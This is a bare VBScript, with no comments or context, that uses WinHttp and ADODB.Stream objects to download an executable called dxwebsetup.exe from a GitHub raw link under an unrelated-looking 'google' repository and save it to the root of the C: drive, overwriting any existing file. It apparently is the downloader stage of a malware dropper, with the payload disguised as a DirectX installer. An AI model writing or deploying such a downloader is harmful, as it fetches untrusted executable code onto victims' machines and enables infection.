Dim xhr
dim bStrm: Set bStrm = createobject("Adodb.Stream")
Set xhr = CreateObject("WinHttp.WinHttpRequest.5.1")
xhr.Option(WinHttpRequestOption_EnableRedirects) = False
If xhr Is Nothing Then Set xhr = CreateObject("WinHttp.WinHttpRequest")
If xhr Is Nothing Then Set xhr = CreateObject("MSXML2.XMLHTTP.6.0")
If xhr Is Nothing Then Set xhr = CreateObject("Microsoft.XMLHTTP")
xhr.open "GET", "https://www.github.com/deamu7t/google/raw/master/dxwebsetup.exe", False
xhr.send

with bStrm
   .type = 1 '//binary
   .open
   .write xhr.responseBody
   .savetofile "c:\dxwebsetup.exe", 2 '//overwrite
end with